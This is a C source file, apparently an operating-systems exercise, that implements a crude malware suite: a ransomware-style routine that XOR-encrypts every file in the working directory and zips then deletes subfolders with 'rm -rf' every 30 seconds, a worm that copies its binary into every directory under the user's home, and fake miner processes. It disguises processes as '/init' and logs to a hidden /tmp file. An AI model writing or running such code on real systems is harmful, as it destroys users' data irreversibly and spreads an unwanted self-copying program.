#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <wait.h>


void xor_file(const char *filename, int key) {
    FILE *f = fopen(filename, "rb+");
    if (!f) return;

    int c;
    long pos = 0;
    while ((c = fgetc(f)) != EOF) {
        fseek(f, pos, SEEK_SET);
        fputc(c ^ key, f);
        pos++;
    }
    fclose(f);
}


void zip_and_encrypt(const char *folderpath, int key) {
    char zipname[512];
    snprintf(zipname, sizeof(zipname), "%s.zip", folderpath);
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "zip -r -q '%s' '%s'", zipname, folderpath);
    system(cmd);
    xor_file(zipname, key);
    char delcmd[512];
    snprintf(delcmd, sizeof(delcmd), "rm -rf '%s'", folderpath);
    system(delcmd);
}

void encrypt_file(const char *filepath, int key) {
    xor_file(filepath, key);
}

void run_wannacryptor() {
    DIR *d = opendir(".");
    if (!d) return;

    time_t t = time(NULL);
    int key = (int)t;
    struct dirent *entry;
    while ((entry = readdir(d)) != NULL) {
        if (!strcmp(entry->d_name, "runme") || !strcmp(entry->d_name, "malware")) continue;
        if (entry->d_type == DT_REG) {
            encrypt_file(entry->d_name, key);
        } else if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") && strcmp(entry->d_name, "..")) {
                zip_and_encrypt(entry->d_name, key);
            }
        }
    }
    closedir(d);
}


void copy_binary_to(const char *path) {
    char dest[1024];
    snprintf(dest, sizeof(dest), "%s/runme", path);
    FILE *src = fopen("./runme", "rb");
    FILE *dst = fopen(dest, "wb");
    if (!src || !dst) return;
    char buf[4096];
    size_t n;
    while ((n = fread(buf, 1, sizeof(buf), src)) > 0)
        fwrite(buf, 1, n, dst);
    fclose(src);
    fclose(dst);
    chmod(dest, 0755);
}

void scan_and_copy(const char *dir) {
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *entry;
    while ((entry = readdir(d)) != NULL) {
        if (entry->d_type == DT_DIR) {
            if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
            char path[1024];
            snprintf(path, sizeof(path), "%s/%s", dir, entry->d_name);
            copy_binary_to(path);
            scan_and_copy(path);
        }
    }
    closedir(d);
}

void run_trojan() {
    char *home = getenv("HOME");
    if (home)
        scan_and_copy(home);
}

//rodok, miner
#define MAX_MINERS 3

void generate_hash(char *buf, size_t len) {
    const char *hex = "0123456789abcdef";
    for (size_t i = 0; i < len; ++i) {
        buf[i] = hex[rand() % 16];
    }
    buf[len] = '\0';
}

void miner_process(int id) {
    char name[64];
    snprintf(name, sizeof(name), "mine-crafter-%d", id);
    prctl(PR_SET_NAME, name, 0, 0, 0);

    srand(time(NULL) + id);
    while (1) {
        char hash[65];
        generate_hash(hash, 64);

        time_t t = time(NULL);
        struct tm *tm_info = localtime(&t);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "[%F %T]", tm_info);

        FILE *f = fopen("/tmp/.miner.log", "a");
        if (f) {
            fprintf(f, "%s[Miner %02d] %s\n", timestamp, id, hash);
            fclose(f);
        }

        sleep((rand() % 28) + 3);
    }
}

void run_rodok() {
    for (int i = 0; i < MAX_MINERS; ++i) {
        pid_t pid = fork();
        if (pid == 0) {
            miner_process(i);
            exit(0);
        }
    }
    while (wait(NULL) > 0); // tunggu semua anak
}

//malware utama
int main() {
    prctl(PR_SET_NAME, "/init", 0, 0, 0);

    pid_t pid = fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "wannacryptor");
        while (1) {
            run_wannacryptor();
            sleep(30);
        }
    }

    pid = fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "trojan.wrm");
        while (1) {
            run_trojan();
            sleep(30);
        }
    }

    pid = fork();
    if (pid == 0) {
        prctl(PR_SET_NAME, "rodok.exe");
        run_rodok();
        exit(0);
    }

    while (1) sleep(1000);
    return 0;
}
